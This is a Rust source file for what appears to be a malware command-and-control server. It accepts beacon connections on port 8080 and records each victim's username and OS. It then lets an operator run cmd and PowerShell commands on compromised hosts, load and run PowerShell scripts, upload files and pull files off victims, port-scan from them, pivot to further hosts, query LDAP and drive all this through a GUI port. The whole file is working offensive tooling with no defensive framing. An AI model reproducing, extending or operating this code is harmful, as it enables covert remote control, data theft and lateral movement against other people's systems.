#![allow(unused_must_use)]

extern crate core;

use std::collections::HashMap;
use std::error::Error;
use std::fs::File;
use std::io::{BufReader, Read, Write};
use std::io;
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use base64::{decode, encode};
use futures::StreamExt;
use tokio::runtime::Runtime;
use tokio::time::interval;

#[derive(Debug)]
pub struct ConnectionInfo {
    pub id: usize,
    pub stream: TcpStream,
    pub is_pivot: bool,
    pub username: String,
    pub os: String,
}

#[tokio::main]
async fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    println!("Listening for incoming connections on port 8080");
    let active_connections: Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>> = Arc::new(Mutex::new(HashMap::new()));
    let client_ids = Arc::new(Mutex::new(HashMap::new()));

    for stream in listener.incoming() {
        let mut stream = stream.unwrap();
        let addr = stream.peer_addr().unwrap().clone();
        let hostname = addr.to_socket_addrs().unwrap().next().unwrap().to_string();
        let active_connections_clone = active_connections.clone();
        let client_ids_clone = client_ids.clone();
        let active_connections_clone3 = active_connections.clone();
        let client_ids_clone2 = client_ids.clone();
        let mut connection_entry = (hostname.clone(), 0);
        {
            let mut active_connections = active_connections_clone.lock().unwrap();
            let mut client_ids = client_ids_clone.lock().unwrap();

            let client_id = match client_ids.get(&hostname) {
                Some(id) => *id,
                None => {
                    let mut lowest_open_id = 1;
                    while active_connections.values().any(|(id, _, _, _, _)| *id == lowest_open_id) {
                        lowest_open_id += 1;
                    }
                    let id_counter = lowest_open_id;
                    client_ids.insert(hostname.clone(), id_counter - 1);
                    id_counter
                }
            };
            connection_entry.1 = client_id;

            if let Some((_, existing_stream, _, _, _)) = active_connections.get_mut(&hostname) {
                *existing_stream = stream.try_clone().unwrap();
            } else {
                let (username, os) = parse_client_info(&mut stream);
                let addr = stream.peer_addr().unwrap().clone();
                let hostname = addr.to_socket_addrs().unwrap().next().unwrap().to_string();
                active_connections.insert(hostname.clone(), (connection_entry.1, stream.try_clone().unwrap(), false, username, os));
            }
        }
        println!("New client connected: {} (ID {})", hostname, connection_entry.1);
        let mut interval = interval(Duration::from_secs(1));
        let stream_clone = stream.try_clone();
        let active_connections_clone2 = active_connections_clone.clone();
        let is_pivot = active_connections.lock().unwrap().get(&hostname).map(|(_, _, is_pivot, _, _)| *is_pivot).unwrap_or(false);
        if !is_pivot {
            tokio::spawn(async move {
                let data = [0; 1];
                while let Some(_) = interval.next().await {
                    match stream_clone.as_ref().expect("REASON").write(&data) {
                        Ok(_) => {}
                        Err(_) => {
                            println!("{} (ID {}) disconnected", hostname, connection_entry.1);
                            let mut active_connections = active_connections_clone2.lock().unwrap();
                            active_connections.remove(&hostname);
                            break;
                        }
                    }
                }
            });
        } else {
            continue;
        };
        thread::spawn(move || {
            let mut rt = Runtime::new().unwrap();
            rt.block_on(async {
                loop {
                    print!("COMMAND> ");
                    std::io::stdout().flush().unwrap();
                    let mut command = String::new();
                    match std::io::stdin().read_line(&mut command) {
                        Ok(_) => {
                            if command.starts_with("cmd") || command.starts_with("psh") {
                                let output = handle_command(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("import-psh") {
                                let output = handle_importpsh(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            }
                            else if command.starts_with("run-psh") {
                                let output = handle_run_script(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            }
                            else if command.starts_with("upload") {
                                let output = handle_upload(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("download") {
                                let output = handle_download(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("list") {
                                let output = handle_list(&active_connections_clone);
                                println!("{}", output);
                            } else if command.starts_with("kill") {
                                let output = handle_kill(&active_connections_clone, &command);
                                println!("{}", output.unwrap());
                            } else if command.starts_with("portscan") {
                                let output = handle_port_scan(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("pivot") {
                                let output = handle_pivot(active_connections_clone3.clone(), client_ids_clone2.clone(), &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("help") {
                                let output = print_help();
                                println!("{}", output);
                            }
                            else if command.starts_with("ldap") {
                                let output = handle_ldap(&active_connections_clone, &command);
                                match output {
                                    Ok(output) => {
                                        println!("{}", output);
                                    }
                                    Err(e) => {
                                        println!("Error: {}", e);
                                    }
                                }
                            } else if command.starts_with("GUI") {
                                let active_connections_clone4 = active_connections_clone3.clone();
                                let gui_switch = false;
                                if gui_switch == true {
                                    println!("GUI is already enabled");
                                    return;
                                } else if command.contains("off") {
                                    println!("GUI is now disabled");
                                    return;
                                } else if gui_switch == false {
                                    handle_guiconnect(active_connections_clone4);
                                }
                            }
                            else if command.starts_with("exit") { handle_exit() } else {
                                println!("Invalid command");
                            }
                        }
                        Err(_) => {
                            println!("Error reading command");
                        }
                    }
                }
            });
        });
    }
}

fn handle_importpsh(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'import-psh ID SCRIPT_NAME'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let script_name = parts[2].trim();
    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let script_file = match File::open(script_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error reading script file {}", script_name)),
    };
    let mut reader = BufReader::new(script_file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer);
    let encoded_script = encode(&buffer);

    let import_cmd = "||IMPORTSCRIPT|| ".to_owned();
    let (_, (_, stream, is_pivot, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = &*stream;
    let command = if *is_pivot {
        format!("||PIVOTCMD|| {}", import_cmd)
    } else {
        import_cmd
    };
    stream
        .write(command.as_bytes())
        .map_err(|_| "Error writing to stream".to_string())?;
    stream
        .write(encoded_script.trim().replace("\r", "").replace("\n", "").as_bytes())
        .map_err(|_| "Error writing to stream".to_string())?;
    stream
        .write(b" |!!done!!|")
        .map_err(|_| "Error writing to stream".to_string())?;
    stream.flush().map_err(|_| "Error flushing stream".to_string())?;
    let n = match stream.read(&mut buffer) {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };
    let response = match String::from_utf8(buffer[..n].to_vec()) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}
fn handle_run_script(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let function_name = parts[2].trim().to_string();

    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, (_, stream, _, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = stream;
    let command = format!("||RUNSCRIPT|| {}", function_name);
    stream.set_read_timeout(Some(std::time::Duration::from_secs(10)));
    stream.write(command.as_bytes()).map_err(|_| "Error writing to stream".to_string())?;
    stream.flush().expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 1024];
        let n = match stream.read(&mut buffer) {
            Ok(n) => n,
            Err(_) => break,
        };
        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}
fn handle_ldap(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str, ) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'cmd ID command'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let ldap_query = parts[2];

    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, (_, stream, is_pivot, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = stream;
    let command = if *is_pivot {
        format!("||PIVOTCMD|| ||LDAPQUERY|| {}", ldap_query)
    } else {
        format!("||LDAPQUERY|| {}", ldap_query)
    };
    stream.set_read_timeout(Some(std::time::Duration::from_secs(10)));
    stream.write(command.as_bytes()).map_err(|_| "Error writing to stream".to_string())?;
    stream.flush().expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||LDAPQUERY||") {
        let mut buffer = [0; 1024];
        let n = match stream.read(&mut buffer) {
            Ok(n) => n,
            Err(_) => break,
        };
        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
    }
    cmdout = cmdout.replace("||LDAPQUERY||", "");
    Ok(cmdout.trim().to_string())
}
fn parse_client_info(stream: &mut TcpStream) -> (String, String) {
    let mut buffer = [0; 1024];
    let n = stream.read(&mut buffer).expect("Error reading from stream");
    let data = String::from_utf8(buffer[..n].to_vec()).expect("Error converting to utf-8");
    let parts: Vec<&str> = data.split("||").collect();
    if parts[1] == "ACSINFO" {
        return (parts[2].to_string(), parts[3].to_string());
    } else {
        return ("".to_string(), "".to_string());
    }
}
fn handle_guiconnect(active_connections: Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>) -> io::Result<()> {
    tokio::spawn(async move {
        let listener = TcpListener::bind("0.0.0.0:9090");
        let active_connections = active_connections.clone();
        loop {
            let (mut socket, _) = listener.as_ref().unwrap().accept().unwrap();
            let done = false;
            while !done {
                let mut buffer = [0; 1024];
                let bytes_read = match socket.read(&mut buffer) {
                    Ok(bytes_read) => bytes_read,
                    Err(_) => continue,
                };
                if bytes_read == 0 {
                    continue;
                }
                let data = String::from_utf8(buffer[..bytes_read].to_vec()).unwrap();
                let active_connections2 = active_connections.try_lock().unwrap();
                if data.contains("||GRAB_INFO||") {
                    let mut info = String::new();
                    for (hostname, (id, _, _, _, _)) in active_connections2.iter() {
                        info.push_str(&format!("{}_{},", hostname, id));
                    }
                    info = format!("\r\n||HOSTINC||{}\r\n", info);
                    socket.write(info.as_bytes()).unwrap();
                    socket.flush();
                } else if data.starts_with("test") {
                    socket.write("Test received.\r\n".as_bytes()).unwrap();
                } else if data.starts_with("cmd") {
                    let data = data.replace("\r", "").replace("\n", "");
                    println!("{}", data);
                    let output = handle_command(&active_connections, &data);
                    socket.write(output.unwrap().as_bytes()).unwrap();
                } else if data.starts_with("list") {
                    let output = handle_list(&active_connections);
                    socket.write(output.as_bytes()).unwrap();
                } else {
                    let unknowncommand = format!("Unknown command: {}", data);
                    socket.write(unknowncommand.as_bytes()).unwrap();
                }
            }
        }
    });
    Ok(())
}
fn handle_command(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.splitn(3, ' ').collect();
    if parts.len() < 3 {
        return Err(format!("Invalid command, expected '{} ID command'", parts[0]));
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let command_str = parts[2].trim().to_string();

    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let (_, (_, stream, is_pivot, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = stream;
    let command_prefix = if command.starts_with("psh") { "||PSHEXEC||" } else { "||CMDEXEC||" };
    let command = if *is_pivot {
        format!("||PIVOTCMD|| {} {}", command_prefix, command_str)
    } else {
        format!("{} {}", command_prefix, command_str)
    };
    stream.set_read_timeout(Some(std::time::Duration::from_secs(10)));
    stream.write(command.as_bytes()).map_err(|_| "Error writing to stream".to_string())?;
    stream.flush().expect("Error flushing stream");
    let mut cmdout = String::new();
    while !cmdout.contains("||cmd||") {
        let mut buffer = [0; 1024];
        let n = match stream.read(&mut buffer) {
            Ok(n) => n,
            Err(_) => break,
        };
        cmdout.push_str(&String::from_utf8(buffer[..n].to_vec()).unwrap());
    }
    cmdout = cmdout.replace("||cmd||", "");
    Ok(cmdout.trim().to_string())
}
fn handle_pivot(active_connections: Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, client_ids: Arc<Mutex<HashMap<String, usize>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 3 {
        return Err("Invalid command, expected 'pivot ID IP PORT'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    let mut active_connections = active_connections.lock().unwrap();
    if id > active_connections.values().count() {
        return Err("Invalid ID".to_string());
    }
    let pivot_ip = parts[2].trim();
    let pivot_port = parts[3];
    let pivot_cmd = "||PIVOT|| ".to_owned() + pivot_ip + " " + &pivot_port;
    let (_, stream, _, _, _) = active_connections.values().nth(id - 1).unwrap();
    let mut stream = &*stream;
    stream.write(pivot_cmd.as_bytes()).expect("Error writing to stream");
    stream.flush().expect("Error flushing stream");

    let pivot_hostname = format!("{}:{}", pivot_ip, pivot_port);
    let mut client_ids = client_ids.lock().unwrap();
    let client_id = client_ids.entry(pivot_hostname.clone()).or_insert_with(|| {
        let mut lowest_open_id = 1;
        while active_connections.values().any(|(id, _, _, _, _)| *id == lowest_open_id) {
            lowest_open_id += 1;
        }
        lowest_open_id
    });

    let mut buffer = [0; 1024];
    let n = match stream.read(&mut buffer) {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };

    let response = std::str::from_utf8(&buffer[..n]).unwrap();
    if response.contains("||CONNECTED||") {
        let pivot_hostname = pivot_hostname.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
        let output = format!("New client connected: {} (ID {})", pivot_hostname, client_id);
        let stream_clone = stream.try_clone().map_err(|_| "Error cloning stream".to_string())?;
        let username = "fixthis".to_string();
        let os = "fixthis".to_string();
        active_connections.insert(pivot_hostname, (*client_id, stream_clone, true, username, os));
        return Ok(output);
    }
    Ok(response.to_string())
}
fn handle_list(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>) -> String {
    let mut list = String::new();
    list.push_str("Active connections:\n");
    for (hostname, (id, _, is_pivot, username, os)) in active_connections.lock().unwrap().iter() {
        if *is_pivot {
            list.push_str(&format!("PIVOT: {} (ID {}) username: {} OS: {}\n", hostname, id, username, os));
        } else {
            list.push_str(&format!("{} (ID {}) username: {} OS: {}\n", hostname, id, username, os));
        }
    }
    list
}
fn handle_upload(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'upload ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let file_name = parts[2].trim();
    let destination = parts[3].trim();
    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let file = match File::open(file_name) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error reading file {}", file_name)),
    };
    let mut reader = BufReader::new(file);
    let mut buffer = Vec::new();
    reader.read_to_end(&mut buffer);
    let encoded_file = encode(&buffer);
    let upload_cmd = "||UPLOAD|| ".to_owned() + &destination;
    let (_, (_, stream, _, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = &*stream;
    stream
        .write(upload_cmd.as_bytes())
        .map_err(|_| "Error writing to stream".to_string())?;
    stream
        .write(encoded_file.trim().replace("\r", "").replace("\n", "").as_bytes())
        .map_err(|_| "Error writing to stream".to_string())?;
    stream
        .write(b" |!!done!!|")
        .map_err(|_| "Error writing to stream".to_string())?;
    stream.flush().map_err(|_| "Error flushing stream".to_string())?;
    let n = match stream.read(&mut buffer) {
        Ok(n) => n,
        Err(_) => return Err("Error reading from stream".to_string()),
    };
    let response = match String::from_utf8(buffer[..n].to_vec()) {
        Ok(response) => response,
        Err(_) => return Err("Error converting response to string".to_string()),
    };
    Ok(response)
}
fn handle_download(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 4 {
        return Err("Invalid command, expected 'download ID file destination'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => return Err("Invalid ID".to_string()),
    };
    let download_input = parts[2].trim();
    let filename = parts[3].trim();
    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let download_cmd = "||DOWNLOAD|| ".to_owned() + &download_input;
    let (_, (_, stream, _, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = &*stream;
    stream.write(download_cmd.as_bytes()).map_err(|_| "Error writing to stream".to_string())?;
    let mut file = match File::create(filename) {
        Ok(file) => file,
        Err(_) => return Err(format!("Error creating file: {}", filename)),
    };
    stream.set_read_timeout(Some(Duration::from_secs(60)));
    let mut buffer = [0; 1024];
    let mut encoded_data = String::new();
    loop {
        match stream.read(&mut buffer) {
            Ok(n) => {
                let data = match String::from_utf8(buffer[..n].to_vec()) {
                    Ok(data) => data,
                    Err(_) => return Err("Error converting data to string".to_string()),
                };
                encoded_data.push_str(&data);
                if data.contains("|!!done!!|") {
                    break;
                }
            }
            Err(err) => return Err(format!("Error receiving data: {}", err)),
        }
    }
    encoded_data = encoded_data.replace("\r", "").replace("\n", "").replace(" |!!done!!|", "");
    let decoded_data = match decode(&encoded_data) {
        Ok(decoded_data) => decoded_data,
        Err(err) => return Err(format!("Error decoding data: {}", err)),
    };
    match file.write_all(&decoded_data) {
        Ok(_) => Ok(format!("DOWNLOAD: File saved to {}.", filename)),
        Err(err) => Err(format!("Error writing to file: {}", err)),
    }
}
fn handle_port_scan(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    if parts.len() < 5 {
        return Err("Invalid command, expected 'portscan ID ip start_port end_port'".to_string());
    }
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }
    let ip = parts[2].trim();
    let num1 = parts[3];
    let num2 = parts[4];
    let port_scan_cmd = "||SCAN|| ".to_owned() + ip + " " + &num1 + " " + num2;
    let (_, (_, stream, _, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = stream;
    stream
        .write(port_scan_cmd.as_bytes())
        .expect("Error writing to stream");
    stream.flush().expect("Error flushing stream");
    let mut buffer = [0; 1024];
    let n = stream.read(&mut buffer).unwrap();
    let response = String::from_utf8(buffer[..n].to_vec()).unwrap();
    let factor = format!("{}:", ip);
    let mut ports: Vec<&str> = response.split(&factor).collect();
    ports.remove(0);
    let formatted_response = ports.join(", ");
    Ok(format!("IP {} has port {} open", ip, formatted_response))
}
fn handle_kill(active_connections: &Arc<Mutex<HashMap<String, (usize, TcpStream, bool, String, String)>>>, command: &str) -> Result<String, String> {
    let parts: Vec<&str> = command.split(" ").collect();
    let id: usize = match parts[1].trim().parse() {
        Ok(num) => num,
        Err(_) => {
            return Err("Invalid ID".to_string());
        }
    };
    if parts.len() < 2 {
        return Err("Invalid command, expected 'kill ID'".to_string());
    }
    let active_connections = active_connections.lock().unwrap();
    if id > active_connections.len() {
        return Err("Invalid ID".to_string());
    }

    let (_, (_, stream, _, _, _)) = active_connections.iter().nth(id - 1).unwrap();
    let mut stream = stream;

    stream.set_read_timeout(Some(std::time::Duration::from_secs(10)));
    stream.write(b"||EXIT||");
    stream.flush().expect("Error flushing stream");
    Ok(format!("Kill command sent too {}.", id))
}
fn handle_exit() {
    println!("Exiting");
    std::process::exit(0);
}
fn print_help() -> String {
    let mut output = "\nAvailable commands:\n\n".to_string();
    output.push_str("  help                  Show this menu\n");
    output.push_str("  list                  List active connections\n");
    output.push_str("  cmd ID command        Send a cmd command to a host\n");
    output.push_str("  psh ID command        Send a PowerShell command to a host\n");
    output.push_str("  import-psh ID file    Import a PowerShell script into the client\n");
    output.push_str("  run-psh ID Function   Run a function from the imported scripts\n");

    output.push_str("  upload ID file dest   Upload a file to a host\n");
    output.push_str("  download ID file dest Download a file from a host\n");
    output.push_str("  portscan ID IP NUM1 NUM2 Port scan a host\n");
    output.push_str("  pivot ID IP PORT      Pivot to another host from the Connection ID\n");
    output.push_str("  kill ID               Kills the beacon on the host\n");
    output.push_str("  GUI                   Enables the GUI\n");
    output.push_str("  exit                  Close all connections and exit\n\n");
    output
}

